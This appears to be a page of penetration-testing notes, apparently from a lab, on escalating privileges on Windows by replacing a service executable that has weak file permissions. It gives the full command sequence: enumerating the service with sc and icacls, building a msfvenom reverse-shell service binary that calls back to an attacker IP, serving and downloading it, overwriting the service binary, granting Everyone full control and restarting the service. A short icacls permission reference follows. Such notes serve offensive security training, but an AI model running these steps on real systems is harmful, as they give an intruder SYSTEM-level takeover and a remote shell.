Insecure Permissions on Service Executable
**********************************************

Query the service

.. code-block:: console

        sc qc WindowsScheduler
                [SC] QueryServiceConfig SUCCESS
                SERVICE_NAME: WindowsScheduler
                TYPE               : 10  WIN32_OWN_PROCESS
                START_TYPE         : 2   AUTO_START
                ERROR_CONTROL      : 0   IGNORE
                BINARY_PATH_NAME   : C:\PROGRA~2\SYSTEM~1\WService.exe                      LOAD_ORDER_GROUP   :
                TAG                : 0
                DISPLAY_NAME       : System Scheduler Service
                DEPENDENCIES       :
                SERVICE_START_NAME : .\svcusr1

Show the permissons. In this case M stands for modify.

.. code-block:: console

        icacls C:\PROGRA~2\SYSTEM~1\WService.exe
                C:\PROGRA~2\SYSTEM~1\WService.exe Everyone:(I)(M)
                NT AUTHORITY\SYSTEM:(I)(F)
                BUILTIN\Administrators:(I)(F)
                BUILTIN\Users:(I)(RX)
                APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(RX)
                 APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(I)(RX)

Create a payload with msfvemon

.. code-block:: console

        msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.6.33.228 LPORT=4444 -f exe-service -o rev-svc.exe

Start a python3 web server

.. code-block:: console

        python3 –m http.server 80

Retrieve file and put executable on service

.. code-block:: console

        wget http://10.6.33.228/rev-svc.exe -o rev-svc.exe
        move C:\PROGRA~2\SYSTEM~1\WService.exe C:\PROGRA~2\SYSTEM~1\WSERVICE.exe.bkp
        move .\rev-svc.exe C:\PROGRA~2\SYSTEM~1\WService.exe

Grant permissons on service

.. code-block:: console

        cacls .\WService.exe /grant Everyone:F
                processed file: .\WService.exe
                Successfully processed 1 files;
        sc.exe stop windowsscheduler
        sc.exe start windowsscheduler

`Windows file permisson icacls <https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/icacls>`_
++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

Simple
^^^^^^^^

* Full permissons = F
* modify = M
* read and execute = RX
* Read-only = R
* Write-only = W

Advanced permissons
^^^^^^^^^^^^^^^^^^^^^^^^

* D - Delete
* RC - Read control (read permissions)
* WDAC - Write DAC (change permissions)
* WO - Write owner (take ownership)
* S - Synchronize
* AS - Access system security
* MA - Maximum allowed
* GR - Generic read
* GW - Generic write
* GE - Generic execute
* GA - Generic all
* RD - Read data/list directory
* WD - Write data/add file
* AD - Append data/add subdirectory
* REA - Read extended attributes
* WEA - Write extended attributes
* X - Execute/traverse
* DC - Delete child
* RA - Read attributes
* WA - Write attributes

